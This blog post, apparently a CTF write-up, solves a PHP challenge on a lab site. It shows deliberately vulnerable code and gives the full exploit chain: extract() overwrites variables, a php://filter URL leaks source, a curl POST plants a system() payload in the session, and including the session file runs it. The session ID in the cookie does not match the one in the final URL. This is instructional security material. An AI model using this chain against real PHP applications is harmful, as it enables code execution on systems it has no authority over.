@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 29 May. 2021 -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Advent of CTF - Challenge 21</title>
+<meta name="generator" content="Org mode">
+<meta name="author" content="Arjen 'credmp' Wiersma">
+<meta description='The blog of Arjen Wiersma'/>
+<link rel='alternate' type='application+rss/xml' title='The blog of Arjen Wiersma' href='posts/rss.xml'/>
+<link rel="stylesheet" href="../../../css/GTD.css?v=76976d55497000bc7c0ec3a55cd8fee7709aaf0a69319efb7a796480448fa7bd" type="text/css">
+</head>
+<body>
+<main id="content">
+<header>
+<h1 class="title">Advent of CTF - Challenge 21</h1>
+<p class="subtitle">&ldquo;Obscure Sessions&rdquo;</p>
+</header><nav id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#org9c4226c">Challenge</a></li>
+<li><a href="#orgf929d58">Solution</a></li>
+</ul>
+</div>
+</nav>
+
+<section id="outline-container-org9c4226c" class="outline-2">
+<h2 id="org9c4226c">Challenge</h2>
+<div class="outline-text-2" id="text-org9c4226c">
+<p>
+Todays challenge is based on that of the XCTF Final 2018 BestPHP. I thought it was such a neat trick that I wanted to share it with you. The challenge is about the affects a well intended PHP ability can have. What you will learn:
+</p>
+
+<ul class="org-ul">
+<li>The <code>call_user_func</code> function</li>
+<li>The <code>extract</code> function</li>
+<li>PHP sessions</li>
+</ul>
+</div>
+</section>
+
+<section id="outline-container-orgf929d58" class="outline-2">
+<h2 id="orgf929d58">Solution</h2>
+<div class="outline-text-2" id="text-orgf929d58">
+<p>
+The challenge starts with a listing of code. 
+</p>
+
+
+<figure id="orgaffde94">
+<img src="index_att/challenge-start.png" alt="challenge-start.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Start of the challenge</figcaption>
+</figure>
+
+<p>
+The code that is listed is reproduced below. Most notably, in the first section <code>ini_set</code> is used to limit where PHP is allowed to read files. Next the <code>$function</code> is set to the parameter <code>function</code> from the URL. This function is passed to the <code>call_user_func</code> function, which according to the documentation does the following:
+</p>
+
+<blockquote>
+<p>
+call_user_func — Call the callback given by the first parameter
+</p>
+</blockquote>
+
+<p>
+After that call, whatever is in the <code>$file</code> parameter will be included. The end of the function actually calls <code>start_session</code> to persist the <code>name</code> POST parameter for later use.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>The code from the challenge</label><pre class="src src-php">&lt;?php
+error_reporting(0);
+
+ini_set('display_errors', 0);
+ini_set('open_basedir', '/var/www/html:/tmp');
+
+# Make sure no evil things are passed in the URL
+$file = 'filters.php';
+$func = isset($_GET['function'])?$_GET['function']:'filters';
+call_user_func($func,$_GET);
+include($file);
+
+# Save the name for later
+session_start();
+if ($_POST["name"]){
+    $_SESSION["name"] = $_POST["name"];
+}
+
+header("Location: /index.php");
+exit();
+?&gt;
+</pre>
+</div>
+
+<p>
+so, how can this be leveraged? In PHP there is a function called <code>extract</code>. The documentation says the following about it:
+</p>
+
+<blockquote>
+<p>
+extract — Import variables into the current symbol table from an array
+</p>
+</blockquote>
+
+<p>
+A little further down in the documentation is a warning about its use:
+</p>
+
+<blockquote>
+<p>
+Warning Do not use extract() on untrusted data, like user input (e.g. $_GET, $_FILES).
+</p>
+</blockquote>
+
+<p>
+Why is this? Well, the function will &ldquo;import&rdquo; variables into the current scope from the array passed. So if an array is passed with a <code>file</code> key, that entry will overwrite whatever is in <code>$file</code>. To try this out, lets extract the <code>index.php</code> file using a <code>base64</code> encoder as we have used in the past.
+</p>
+
+<pre class="example">
+https://21.adventofctf.com/get_flag.php?function=extract&amp;file=php://filter/convert.base64-encode/resource=index.php
+</pre>
+
+<p>
+Retrieving the flag will not work, as it is outside the base path. You will however find out that in <code>/tmp</code> the session files are stored. This can be leverated as you have the ability to add something to the session through the <code>name</code> post parameter. In the curl command below the PHP expression <code>&lt;?=</code> is called, which will echo the result of the function call inside of it, in this case the <code>system</code> call. You have to use <code>system</code> as it is not possible for regular PHP functions to read outside of the base path.
+</p>
+
+<pre class="example">
+curl -v -X POST -d "name=&lt;?=system('cat /flag.txt');?&gt;" https://21.adventofctf.com/get_flag.php
+</pre>
+
+<p>
+In the output it is important to note the <code>PHPSESSID</code>, as that session will contain the payload.
+</p>
+
+<pre class="example">
+&lt; Set-Cookie: PHPSESSID=232acdf771eaf2d75c03d7ef31960ce9; path=/
+</pre>
+
+<p>
+The last step is to use <code>extract</code> to override the <code>file</code> variable and point it to the session that is stored with the payload.
+</p>
+
+<pre class="example">
+https://21.adventofctf.com/get_flag.php?function=extract&amp;file=/tmp/sess_dc0c104933094ad8d0afcf7d2a778cd9
+</pre>
+
+<p>
+It will end up printing the payload to the screen.
+</p>
+
+
+<figure id="org2fd2c53">
+<img src="index_att/the-flag.png" alt="the-flag.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>The flag</figcaption>
+</figure>
+
+<p>
+Be sure to also grab the badge!
+</p>
+
+
+<figure id="orgace58a3">
+<img src="./index_att/badge.png" alt="badge.png">
+
+</figure>
+
+<p>
+Go back to the <a href="../../../index.html">homepage</a>.
+</p>
+</div>
+</section>
+</main>
+<footer id="postamble" class="status">
+<p class="author">Author: Arjen &rsquo;credmp&rsquo; Wiersma</p>
+<p class="date">Created: 29 May. 2021</p>
+</footer>
+</body>
+</html>
